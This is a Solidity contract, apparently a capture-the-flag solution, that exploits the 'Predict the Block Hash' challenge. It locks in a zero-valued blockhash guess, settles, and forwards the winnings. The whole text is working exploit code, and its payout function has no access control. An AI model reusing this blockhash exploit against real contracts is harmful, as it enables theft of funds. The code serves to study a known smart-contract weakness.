/**
 *Submitted for verification at Etherscan.io on 2021-08-05
*/

pragma solidity ^0.4.21;

interface IPredictTheBlockHash {
    function lockInGuess(bytes32 hash) external payable;
    function settle() external;
}

contract CheatTheBlockHash {
    function startChallenge() public {
        IPredictTheBlockHash i = IPredictTheBlockHash(0xc78606795f9d98EAefFE194fAfa9c13af043f555);
        bytes32 answer = block.blockhash(block.number + 1);
        i.lockInGuess.value(1 ether)(answer);
    }
    
    function attemptGuess() public {
        IPredictTheBlockHash i = IPredictTheBlockHash(0xc78606795f9d98EAefFE194fAfa9c13af043f555);
        i.settle();
        msg.sender.transfer(2 ether);
    }
    
    function() public payable {}
}